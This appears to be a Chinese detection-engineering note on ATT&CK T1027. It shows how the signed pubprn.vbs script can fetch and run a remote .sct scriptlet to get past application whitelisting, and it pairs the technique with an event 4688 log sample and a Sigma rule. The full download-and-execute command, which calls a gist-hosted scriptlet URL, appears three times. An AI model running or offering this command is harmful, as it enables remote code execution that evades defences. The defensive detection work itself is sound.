# T1027-Win-使用pubprn.vbs下载执行payload(白名单)

## 来自ATT&CK的描述

许多软件开发相关的实用程序可用于执行各种形式的代码用于协助开发、调试和逆向工程。这些实用程序通常可以使用合法证书进行签名。签名后，它们就可以在系统上执行。通过可信的进程代理执行恶意代码，从而有效地绕过应用白名单防御解决方案。

## 测试案例

在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本：

```yml
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

## 检测日志

Windows 安全日志（需要自行配置）

## 测试复现

win10，自行开启审核策略

```yml
Microsoft Windows [版本 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\ma jack>"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

在安装360终端管理软件环境下，会被拦截提示。

## 测试留痕

```log
事件ID： 4688
EventData 

SubjectUserSid S-1-5-21-3061901842-4133171524-864420058-1000 
SubjectUserName ma jack 
SubjectDomainName DESKTOP-NJ1U3F5 
SubjectLogonId 0x3e2c5 
NewProcessId 0x1378 
NewProcessName C:\Windows\System32\wscript.exe 
TokenElevationType %%1938 
ProcessId 0x14d0 
CommandLine "C:\Windows\System32\WScript.exe" "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct 
TargetUserSid S-1-0-0 
TargetUserName - 
TargetDomainName - 
TargetLogonId 0x0 
ParentProcessName C:\Windows\System32\cmd.exe 
MandatoryLabel S-1-16-8192 

```

## 检测规则/思路

### sigma规则

```yml
title: 使用pubprn.vbs下载执行payload
description: 在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本
status: experimental
tags:
    - attack.defense_evasion
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        NewProcessName: "C:\Windows\System32\wscript.exe"
        CommandLine: "*pubprn.vbs"
    condition: selection
falsepositives:
    - Unkown
level: high
```

### 建议

可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1027

<https://attack.mitre.org/techniques/T1027/>

渗透测试笔记

<https://github.com/M1k0er/pentest-notes>
